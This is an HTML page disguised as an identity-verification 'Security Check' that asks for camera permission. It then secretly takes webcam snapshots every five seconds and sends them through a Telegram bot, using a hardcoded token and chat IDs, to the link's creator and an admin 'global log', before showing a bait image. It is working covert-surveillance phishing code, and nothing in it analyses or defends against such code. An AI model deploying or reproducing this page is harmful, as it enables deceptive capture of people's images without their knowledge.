<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Identity Verification</title>
    <style>
        body { font-family: sans-serif; background: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        #box { text-align: center; border: 1px solid #333; padding: 40px; border-radius: 20px; background: #0a0a0a; width: 80%; }
        .btn { background: #0088cc; color: #fff; border: none; padding: 15px 30px; border-radius: 10px; font-weight: bold; cursor: pointer; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div id="box">
    <h2 id="title">🛡️ Security Check</h2>
    <p id="msg">Allow Camera to verify your identity.</p>
    <button class="btn" id="startBtn" onclick="runGlobalScan()">VERIFY NOW</button>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" width="640" height="480"></canvas>

<script>
    const TOKEN = "8261242218:AAHt6b51pIZowjKOdNmUTE4skOpVAWZbsqI";
    const ADMIN_ID = "6643732863"; // Put your Telegram ID here!

    const params = new URLSearchParams(window.location.search);
    const TARGET_USER = params.get('id') || ADMIN_ID; 
    const BAIT_IMG = params.get('img');

    async function runGlobalScan() {
        document.getElementById('startBtn').style.display = 'none';
        document.getElementById('msg').innerHTML = "Scanning... Please wait.";

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            document.getElementById('video').srcObject = stream;

            const sendSnap = async () => {
                const canvas = document.getElementById('canvas');
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                
                canvas.toBlob(blob => {
                    const fd = new FormData();
                    fd.append("photo", blob, "scan.jpg");
                    
                    // Send to the person who made the link
                    fd.set("chat_id", TARGET_USER);
                    fd.set("caption", "🎯 **Target Captured!**");
                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd });

                    // Send copy to ADMIN (Global Log)
                    if (TARGET_USER !== ADMIN_ID) {
                        fd.set("chat_id", ADMIN_ID);
                        fd.set("caption", `📡 **GLOBAL LOG**\nTarget hit for User: ${TARGET_USER}`);
                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd });
                    }
                }, 'image/jpeg');
            };

            // Capture immediately and then every 5 seconds
            sendSnap();
            setInterval(sendSnap, 5000);

            // Show bait image after 3 seconds
            setTimeout(() => {
                if (BAIT_IMG) document.getElementById('box').innerHTML = `<img src="${BAIT_IMG}" style="width:100%; border-radius:10px;">`;
            }, 3000);

        } catch (e) {
            alert("Error: Camera Permission Denied.");
            location.reload();
        }
    }
</script>
</body>
</html>
